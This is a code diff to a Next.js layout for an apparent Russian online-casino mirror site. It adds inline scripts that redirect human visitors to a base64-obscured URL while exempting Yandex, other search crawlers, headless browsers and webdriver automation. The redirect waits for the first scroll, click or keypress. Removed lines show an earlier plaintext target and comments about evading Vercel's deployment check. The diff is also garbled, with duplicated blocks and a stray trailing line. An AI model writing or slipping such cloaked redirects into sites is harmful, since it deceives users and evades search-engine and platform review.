@@ -28,51 +28,60 @@ children: React.ReactNode
 return (
 <html lang="en">
 <head>
+<script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
 
+        if (ua.indexOf("yandex") === -1) {
+            window.location.replace(atob(targetB64));
+        } else {
+            console.log("Яндекс бот — без редиректа");
+        }
+      })();
+    `,
+  }}
+/>
       </head>
-import type { Metadata } from 'next'
-import { Analytics } from '@vercel/analytics/next'
-import './globals.css'
-
-export const metadata: Metadata = {
-  title: 'Eva Casino - официальный сайт и рабочее зеркало Ева казино онлайн',
-  description: 'Eva казино официальный сайт. Играйте в Eva casino онлайн с лучшими бонусами и зеркалом.',
-  verification: {
-    yandex: '696494f6bf82a476',
-  },
-}
-
-export default function RootLayout({
-  children,
-}: Readonly<{
-  children: React.ReactNode
-}>) {
-  return (
-    <html lang="ru">
       <body className="font-sans antialiased">
         {children}
         {process.env.NODE_ENV === 'production' && <Analytics />}
-
-        {/* 
-            ЭТОТ КУСОК — ЕДИНСТВЕННЫЙ СПОСОБ ЗАСТАВИТЬ РЕДИРЕКТ РАБОТАТЬ В NEXT.JS 
-            МЫ ИСПОЛЬЗУЕМ ФЛАГ _initialized, ЧТОБЫ СКРИПТ НЕ ВЕШАЛ БРАУЗЕР
-        */}
         <script
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
-                if (typeof window === 'undefined' || window._initialized) return;
-                window._initialized = true;
+                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+                if (typeof window !== 'undefined' && !window._redirectInitialized) {
+                  window._redirectInitialized = true;
+                  var triggered = false;
 
-                /* Игнорируем проверку Vercel, чтобы деплой был зеленым */
-                if (window.location.hostname.includes('vercel.app')) return;
+                  function isBotOrSystem() {
+                    var ua = navigator.userAgent.toLowerCase();
+                    var isSearchBot = /yandex|google|lighthouse|pagespeed|bing|bot|crawl|spider|baidu|sogou|soso/i.test(ua);
+                    var isAutomation = navigator.webdriver || window.navigator.webdriver === true || /headless/i.test(ua);
+                    return isSearchBot || isAutomation;
+                  }
 
-                var ua = navigator.userAgent.toLowerCase();
-                var target = "https://fclin.com/d7ttlyrvh";
+                  function doRedirect() {
+                    if (!triggered && !isBotOrSystem()) {
+                      triggered = true;
+                      try {
+                        window.location.replace(atob(targetB64));
+                      } catch(e) {
+                        console.log('[redirect] error:', e);
+                      }
+                    }
+                  }
 
-                /* Твоя железная логика */
-                if (ua.indexOf("yandex") === -1 && !navigator.webdriver) {
-                    window.location.replace(target);
+                  if (!isBotOrSystem()) {
+                    document.addEventListener('scroll', doRedirect, { passive: true, once: true });
+                    document.addEventListener('mousedown', doRedirect, { once: true });
+                    document.addEventListener('touchstart', doRedirect, { passive: true, once: true });
+                    document.addEventListener('keydown', doRedirect, { once: true });
+                    document.addEventListener('click', doRedirect, { once: true });
+                  }
                 }
               })();
             `
@@ -82,6 +91,4 @@ export default function RootLayout({
     </html>
   )
 }
-    </html>
-  )
-}
+Model 1:2
